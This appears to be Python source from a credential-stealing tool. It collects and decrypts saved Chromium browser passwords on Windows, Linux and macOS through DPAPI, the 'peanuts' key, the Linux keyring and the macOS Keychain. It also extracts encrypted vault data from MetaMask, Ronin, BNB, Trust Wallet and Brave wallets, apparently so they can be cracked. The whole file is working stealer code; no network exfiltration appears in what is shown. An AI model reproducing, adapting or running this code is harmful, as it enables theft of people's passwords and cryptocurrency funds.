import aiofiles
import aiosqlite
import base64
import ctypes
import json
import sys
import os
import re
from leveldb import RawLevelDb
from w3crack import WalletType
from enum import Flag, auto
from walletreq import WalletReq
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

class ChromiumFlags(Flag):
	Brave = auto()
	Yandex = auto()

class ChromiumBrowser:
	def __init__(self, browsername: str, browserpath: str, datapath: str, flags: ChromiumFlags):
		self.datapath = browserpath + datapath
		self.flags = flags
		self.name = browsername
		self.master_key = None
	
	async def collect_passwords(self) -> set[str]:
		# note that we won't try to extract passwords from yandex browser
		# this is because they use their custom passwords storage which doesn't match
		# the format of other browsers. These passwords also encrypted used master password
		# which we don't really wanna guess. Maybe in the future I'll implement this as well
		# but since this is single case I guess common shared method will be enough for now
		passwords: set[str] = set()
		if ChromiumFlags.Yandex in self.flags:
			return passwords

		if sys.platform.startswith("win"):
			extract_function = self.__extract_password_windows
		elif sys.platform.startswith("linux"):
			extract_function = self.__extract_password_linux
		elif sys.platform.startswith("darwin"):
			extract_function = self.__extract_password_mac
		else:
			raise "not implemented"
		
		loginspath = self.datapath + "Login Data"

		try:
			db = await aiosqlite.connect(loginspath)
		except:
			return passwords
		
		try:
			async with db.execute("SELECT password_value AS pass FROM logins") as cursor:
				async for row in cursor:
					encrypted_password = row[0]
					password = await extract_function(encrypted_password)
					if password != None:
						passwords.add(password)
		except:
			pass
		finally:
			await db.close()
		
		return passwords

	async def collect_wallets(self) -> list[WalletReq]:
		wallets = []

		collected_exts = await self.__collect_wallet_extensions()
		if len(collected_exts):
			wallets = wallets + collected_exts

		# if this is brave browser, then try to extract brave wallet as well
		if ChromiumFlags.Brave in self.flags:
			brave_wallet = await self.__extract_brave_wallet()
			wallets.append(WalletReq(brave_wallet, WalletType.Brave, self.name, "Brave"))
		
		return wallets

	async def __collect_wallet_extensions(self) -> list[WalletReq]:
		# iterate over extensions and test them against supported wallet extensions
		global chromium_extensions_wallets
		extensions_path = self.datapath + "Local Extension Settings"
		extensions_dir = os.fsencode(extensions_path)

		wallets = []
		try:
			folders = os.listdir(extensions_dir)
		except:
			return wallets
		
		for folder in folders:
			folder = os.fsdecode(folder)
			action = chromium_extensions_wallets.get(folder)
			if action != None:
				extract_wallet, wallet_name = action
				extpath = extensions_path + os.sep + folder + os.sep
				wallet_data = await extract_wallet(self, extpath)
				if wallet_data != None:
					wallet_data.set_name(wallet_name)
					wallets.append(wallet_data)
		
		return wallets

	async def extract_metamask_wallet(self, extpath: str) -> WalletReq | None:
		try:
			ldb = RawLevelDb(extpath)
		except:
			return None
		
		for record in ldb.iterate_records_raw():
			wallet = await self.__extract_metamask_like_wallet_from_ldb(record.value, True, 0, WalletType.MetaMask)
			if wallet != None:
				return wallet

		return None

	async def extract_ronin_wallet(self, extpath: str) -> WalletReq | None:
		try:
			ldb = RawLevelDb(extpath)
		except:
			return None
		
		for record in ldb.iterate_records_raw():
			if record.key.startswith(b"encryptedVault"):
				wallet = await self.__extract_metamask_like_wallet_from_ldb(record.value, False, 16384, WalletType.Ronin)
				if wallet != None:
					return wallet

		return None
	
	async def extract_bnb_wallet(self, extpath: str) -> WalletReq | None:
		try:
			ldb = RawLevelDb(extpath)
		except:
			return None
		
		for record in ldb.iterate_records_raw():
			if record.key.startswith(b"vault"):
				wallet = await self.__extract_metamask_like_wallet_from_ldb(record.value, False, 0, WalletType.Binance)
				if wallet != None:
					return wallet

		return None

	# NOTE: this function will load CPU highly due to regex look up
	# however it is used only a few times so it should be ok
	# it just look ups for encrypted vault data thats it
	async def __extract_metamask_like_wallet_from_ldb(self, file_data: bytes, find_vault: bool, max_vault_lookup_region: int, wallet_type: WalletType) -> WalletReq | None:
		# before we go into regex, try to look up for vault string first
		# we gonna then strip it to 16 KB and lookup this block
		# we do that to speed up the process cuz regex is too slow and eats too much CPU
		if max_vault_lookup_region == 0:
			max_vault_lookup_region = 16384
		else:
			# at this point strip here
			file_data = file_data[:max_vault_lookup_region]

		if find_vault:
			vault_string_pos = file_data.find(b"\"vault\":\"{")
			if vault_string_pos == -1:
				return None
			file_data = file_data[vault_string_pos:][:max_vault_lookup_region]

		regex = r'(?=.*(\\\"data\\\":\\\"(.+?)\\\"))(?=.*(\\\"iv\\\":\\\"(.+?)\\\"))(?=.*(\\\"salt\\\":\\\"(.+?)\\\"))(?=.*(\\\"iterations\\\":([0-9]+)))?(?=.*(\\\"algorithm\\\":\\\"(.+?)\\\"))?'.encode()
		matches = re.search(regex, file_data, re.MULTILINE)
		if matches:
			iters = None
			algorithm = None
			data = matches.group(2)
			iv = matches.group(4)
			salt = matches.group(6)
			if matches.lastindex >= 8:
				iters = matches.group(8)
				if matches.lastindex >= 10:
					algorithm = matches.group(10)
			
			# reencode it as json now
			data = data.decode("utf-8")
			iv = iv.decode("utf-8")
			salt = salt.decode("utf-8")
			iters = int(iters.decode("utf-8") if isinstance(iters, bytes) else "10000")
			algorithm = algorithm.decode("utf-8") if isinstance(algorithm, bytes) else "PBKDF2"
			metamask_wallet = { "data": data, "iv": iv, "salt": salt, "keyMetadata": { "algorithm": algorithm, "params": { "iterations": iters } } }
			return WalletReq(json.dumps(metamask_wallet), wallet_type, self.name)
		return None
	
	async def extract_trust_wallet(self, extpath: str) -> WalletReq | None:
		try:
			ldb = RawLevelDb(extpath)
		except:
			return None
		
		# this one is super special, it is not like many other wallets
		salts: set[str] = set()
		vault = None

		for record in ldb.iterate_records_raw():
			if record.key.startswith(b"trust:pbkdf2"):
				try:
					salt = json.loads(json.loads(record.value))["salt"]
					if salt != None:
						salts.add(salt)
				except:
					pass
			elif vault == None and b"ciphertext" in record.value and b"kdfparams" in record.value:
				try:
					vault_data = json.loads(record.value)
					if vault_data["type"] != "mnemonic":
						continue

					crypto = vault_data["crypto"]
					if crypto != None:
						vault = crypto

				except:
					pass

		# if we found the vault, then repack it a little
		if vault != None:
			try:
				result_vault = {
					"data": vault["ciphertext"],
					"iv": vault["cipherparams"]["iv"],
					"mac": vault["mac"],
					"salts": list(salts),
					"cipher": vault["cipher"],
					"keylen": 0,
					"params": None
				}

				kdf = vault["kdf"]
				kdfparams = vault["kdfparams"]
				match kdf:
					case "pbkdf2":
						result_vault["keylen"] = kdfparams["dklen"]
						result_vault["params"] = { "salt": kdfparams["salt"], "iterations": kdfparams["c"] }
					case "scrypt":
						result_vault["keylen"] = kdfparams["dklen"]
						result_vault["params"] = { "salt": kdfparams["salt"], "n": kdfparams["n"], "p": kdfparams["p"], "r": kdfparams["r"] }
					case _: # unknown KDF
						return None

				return WalletReq(json.dumps(result_vault), WalletType.TrustWallet, self.name)
			except:
				pass

		return None

	async def __extract_brave_wallet(self) -> str | None:
		# https://github.com/brave/brave-core/blob/92a592bac37d05075f3195345c266b0186a00ca1/components/brave_wallet/browser/keyring_service.cc#L1129
		walletfile = self.datapath + "Preferences"
		try:
			async with aiofiles.open(walletfile, "r") as f:
				file_data = await f.read()
				bravedata = json.loads(file_data)
				wallet = bravedata["brave"]["wallet"]["keyrings"]["default"]
				if wallet != None:
					is_legacy = wallet["legacy_brave_wallet"]
					is_legacy = is_legacy if is_legacy != None else True
					encrypted_mnemonic = wallet["encrypted_mnemonic"]
					iv = wallet["password_encryptor_nonce"]
					salt = wallet["password_encryptor_salt"]
					if encrypted_mnemonic == None or iv == None or salt == None:
						return None

					# these values are hardcoded
					iterations = 100000 if is_legacy else 310000

					# reencode it as json now
					brave_wallet = { "data": encrypted_mnemonic, "iv": iv, "salt": salt, "iterations": iterations }
					return json.dumps(brave_wallet)
		except:
			pass
		return None

	async def extract_wallet_not_implemented(self, _, __) -> WalletReq | None:
		return None

	async def __extract_password_windows(self, encrypted_password: bytes) -> str | None:
		decrypted_password = await self.__windows_decrypt(encrypted_password)
		if decrypted_password != None:
			try:
				password = decrypted_password.decode("utf-8")
				if len(password) != 0:
					return password
			except:
				pass
		return None
	
	async def __extract_password_linux(self, encrypted_password: bytes) -> str | None:
		decrypted_password = self.__linux_decrypt(encrypted_password)
		if decrypted_password != None:
			try:
				password = decrypted_password.decode("utf-8")
				if len(password) != 0:
					return password
			except:
				pass
		return None
	
	async def __extract_password_mac(self, encrypted_password: bytes) -> str | None:
		decrypted_password = self.__mac_decrypt(encrypted_password)
		if decrypted_password != None:
			try:
				password = decrypted_password.decode("utf-8")
				if len(password) != 0:
					return password
			except:
				pass
		return None

	async def __windows_decrypt(self, value: bytes) -> bytes | None:
		if len(value) != 0:
			# first of all we want to check the prefix, newer chromium versions put v10/v11 prefix to identify new encryption
			if value.startswith(b"v10") or value.startswith(b"v11"):
				if len(value) >= 32:
					# prefix (3) + tag (16) + iv (12) + 1 (at least 1 byte of data) = 32, so this is minimum size
					# also we will give it a chance to fallback to the old method
					# I mean the chance is really low, but there can be collisions...
					# remove the prefix now, we don't need it anymore
					value_noprefix = value[3:]
					master_key = await self.__windows_get_master_key()
					if master_key != None:
						try:
							cipher = AES.new(master_key, AES.MODE_GCM, value_noprefix[:12])
							value_noprefix = value_noprefix[12:]
							dec = cipher.decrypt_and_verify(value_noprefix[:-16], value_noprefix[-16:])
							return dec
						except:
							pass
			
			# fallback to the unprotect then, if it fails, it fails
			return self.__windows_unprotect(value)
		else:
			return None
	
	async def __windows_get_master_key(self) -> bytes | None:
		if self.master_key != None:
			return self.master_key
		else:
			localstatepath = self.datapath + "Local State"
			try:
				f = await aiofiles.open(localstatepath, "r", encoding="utf-8")
			except:

				# assume they are in the parent folder. May happen with some browsers
				localstatepath = self.datapath + "..\\Local State"
				try:
					f = await aiofiles.open(localstatepath, "r", encoding="utf-8")
				except:
					return None
			
			try:
				filedata = await f.read()
				local_state = json.loads(filedata)
				master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
				if len(master_key) != 0:
					master_key = self.__windows_unprotect(master_key[5:])
					if master_key != None:
						self.master_key = master_key
						return master_key
			except:
				pass
			return None
		
	@staticmethod
	def __windows_unprotect(data: bytes) -> bytes | None:
		data_len = len(data)
		buffer_in = ctypes.c_buffer(data, data_len)
		buffer_entropy = ctypes.c_buffer(b"", 0)
		
		# this one is windows specific and only used here, so it is defined localy
		class DATA_BLOB(ctypes.Structure):
			_fields_ = [
				("cbData", ctypes.c_ulong),
				("pbData", ctypes.POINTER(ctypes.c_char))
			]

		# decrypt and free the data now
		blob_in = DATA_BLOB(data_len, buffer_in)
		blob_entropy = DATA_BLOB(0, buffer_entropy)
		blob_out = DATA_BLOB()
		if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, ctypes.byref(blob_entropy), None, None, 0x01, ctypes.byref(blob_out)):
			cbData = int(blob_out.cbData)
			pbData = blob_out.pbData
			buffer = ctypes.create_string_buffer(cbData)
			ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
			ctypes.windll.kernel32.LocalFree(pbData)
			return buffer.raw
		return None
	
	def __linux_decrypt(self, value: bytes) -> bytes | None:
		if len(value) != 0:
			version = 11 if value.startswith(b"v11") else 10 if value.startswith(b"v10") else 0
			master_key = self.__linux_get_master_key(version)
			if master_key != None:
				value = value[3:]

				# 30000 iq, along with CBC mode... These folks are really bad at cryptography
				iv = b' ' * 16
				try:
					cipher = AES.new(master_key, AES.MODE_CBC, IV=iv)
					dec = cipher.decrypt(value)
					return dec
				except:
					pass
		return None

	def __linux_get_master_key(self, version = 10) -> bytes:
		if self.master_key != None:
			match version:
				case 10: return self.master_key[0]
				case 11: return self.master_key[1]
				case _: return None
		else:
			# 10000 iq chrome devs moment
			masterpass_v10 = "peanuts".encode("utf-8")
			masterpass_v11 = None

			# however the password may be overriden by secret storage
			# import it on linux and try to exract password in case if it was overriden
			import secretstorage
			bus = secretstorage.dbus_init()
			collection = secretstorage.get_default_collection(bus)
			for item in collection.get_all_items():

				# The meaning of life
				# https://github.com/chromium/chromium/blob/7412e35984d37bf08a61a85eaba24265b3fbce7f/components/os_crypt/sync/libsecret_util_linux.cc#L165
				# 20000 iq
				if item.get_label().startswith("Chrome Safe Storage"):
					masterpass_v11 = item.get_secret()
					break
			
			# now it worth to make it clear, saltysalt is hardcoded salt for pbkdf2
			# for v10 encryption "peanuts" password is still used, for v11 they import
			# password from the keyring. We must differ them now
			# https://github.com/chromium/chromium/blob/fd8a8914ca0183f0add65ae55f04e287543c7d4a/components/os_crypt/os_crypt_linux.cc#L87C14-L87C28
			self.master_key = [None] * 2
			self.master_key[0] = PBKDF2(masterpass_v10, b'saltysalt', 16, 1)
			if masterpass_v11 != None:
				self.master_key[1] = PBKDF2(masterpass_v11, b'saltysalt', 16, 1)
			match version:
				case 10: return self.master_key[0]
				case 11: return self.master_key[1]
				case _: return None

	def __mac_decrypt(self, value: bytes) -> bytes | None:
		if len(value) != 0:
			if value.startswith(b"v10") or value.startswith(b"v11"):

				# remove the prefix now, we don't need it anymore
				value = value[3:]
				master_key = self.__mac_get_master_key()
				if master_key != None:
					iv = b' ' * 16
					try:
						cipher = AES.new(master_key, AES.MODE_CBC, IV=iv)
						dec = cipher.decrypt(value)
						return dec
					except:
						pass
				
				return None
		else:
			return None

	def __mac_get_master_key(self) -> bytes:
		if self.master_key != None:
			return self.master_key
		else:
			import subprocess

			# easiest way to do this
			password = subprocess.Popen(
				"security find-generic-password -wa 'Chrome'",
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				shell = True
			)

			stdout, _ = password.communicate()
			password = stdout.replace(b'\n', b'')

			# everything else is the same as on linux but 1003 iterations
			self.master_key = PBKDF2(password, b'saltysalt', 16, 1003)
			return self.master_key


# chromium ext <=> (extract function, wallet_name)
chromium_extensions_wallets = {
	"nkbihfbeogaeaoehlefnkodbefgpgknn": (ChromiumBrowser.extract_metamask_wallet, "Metamask"), # Metamask
	"ejbalbakoplchlghecdalmeeeajnimhm": (ChromiumBrowser.extract_metamask_wallet, "Metamask"), # Metamask (edge)
	"djclckkglechooblngghdinmeemkbgci": (ChromiumBrowser.extract_metamask_wallet, "Metamask"), # Metamask (opera)
	"fnjhmkhhmkbjkkabndcnnogagogbneec": (ChromiumBrowser.extract_ronin_wallet, "Ronin"), # Ronin Wallet
	"fhbohimaelbohpjbbldcngcnapndodjp": (ChromiumBrowser.extract_bnb_wallet, "BNB Chain"), # BinanceChain
	"egjidjbpglichdcondbcbdnbeeppgdph": (ChromiumBrowser.extract_trust_wallet, "Trust Wallet"), # Trust Wallet
}